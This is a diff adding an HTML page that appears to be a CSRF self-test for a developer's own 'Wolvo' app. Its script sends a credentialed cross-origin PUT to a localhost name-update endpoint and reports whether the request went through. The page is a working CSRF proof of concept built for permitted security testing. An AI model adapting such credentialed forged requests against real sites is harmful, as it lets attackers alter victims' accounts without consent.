@@ -1,0 +1,95 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>Wolvo CSRF Attack Test — Update Name</title>
+  <style>
+    * { box-sizing: border-box; }
+    body {
+      margin: 0; min-height: 100vh;
+      display: grid; place-items: center;
+      padding: 24px; background: #09090d; color: #f4f4f5;
+      font-family: Inter, system-ui, sans-serif;
+    }
+    .card { width: 100%; max-width: 520px; padding: 30px;
+      background: #15151d; border: 1px solid #30303d;
+      border-radius: 18px; box-shadow: 0 20px 70px #0005; }
+    .icon { display: grid; place-items: center; width: 48px; height: 48px;
+      margin-bottom: 20px; border-radius: 14px;
+      background: #3f42be22; color: #9295ff; font-size: 24px; }
+    h1 { margin: 0 0 10px; font-size: 24px; }
+    p { color: #a1a1aa; line-height: 1.65; font-size: 14px; }
+    .route { margin: 20px 0; padding: 14px;
+      overflow-wrap: anywhere; border: 1px solid #30303d;
+      border-radius: 10px; background: #0b0b10; color: #c4c5ff;
+      font: 12px/1.7 monospace; }
+    button { width: 100%; padding: 13px 16px;
+      border: 0; border-radius: 10px;
+      background: #3f42be; color: white;
+      font-size: 14px; font-weight: 600; cursor: pointer;
+      transition: background .2s; }
+    button:hover { background: #5054d8; }
+    .notice { margin-top: 20px; padding: 14px;
+      border-radius: 10px; background: #242417; color: #e4d7a0;
+      font-size: 13px; line-height: 1.6; }
+    #result { margin-top: 18px; white-space: pre-wrap;
+      overflow-wrap: anywhere; color: #d4d4d8;
+      font: 12px/1.7 monospace; }
+  </style>
+</head>
+<body>
+  <main class="card">
+    <div class="icon">🛡</div>
+    <h1>Wolvo CSRF Attack Test</h1>
+    <p>
+      This page attempts a cross-origin PUT request to change the authenticated
+      user's name. <b>Do not use against any app you do not own or have permission to test.</b>
+    </p>
+
+    <div class="route">
+      PUT http://localhost:5000/api/v1/usersetting/update-name<br />
+      Middleware: verifyJwt<br />
+      Target: Authenticated user's name field
+    </div>
+
+    <button id="attackBtn">Run CSRF Attack Simulation</button>
+
+    <div class="notice">
+      This test submits a cross-site request using your current browser session
+      cookies/tokens. Verify the outcome in your <b>Wolvo app tab</b> and <b>server logs</b>.
+      A "200 OK" or success message while on a different origin indicates the route
+      may be vulnerable to CSRF.
+    </div>
+
+    <pre id="result">Status: Ready — open this page while logged into your Wolvo app.</pre>
+  </main>
+
+  <script>
+    const result = document.getElementById("result");
+    const attackBtn = document.getElementById("attackBtn");
+
+    attackBtn.onclick = async () => {
+      result.textContent = "Attempting cross-site PUT to update name...";
+      try {
+        // This uses credentials: include so the browser sends the session cookies
+        // associated with localhost:5000 from the current browser profile.
+        const res = await fetch("http://localhost:5000/api/v1/usersetting/update-name", {
+          method: "PUT",
+          headers: { "Content-Type": "application/json" },
+          body: JSON.stringify({ name: "CSRF-Test-Name-Updated" }),
+          credentials: "include" // <--- Critical: sends cookies
+        });
+        const text = await res.text();
+        const data = res.headers.get("content-type")?.includes("application/json") ? JSON.parse(text) : {};
+        result.textContent = `Response Status: ${res.status}\n`;
+        result.textContent += data && data.success
+          ? `Result: ${JSON.stringify(data, null, 2)}`
+          : `Response: ${text}`;
+      } catch (e) {
+        result.textContent = `Attack Blocked/Failed: ${e.message}`;
+      }
+    };
+  </script>
+</body>
+</html>
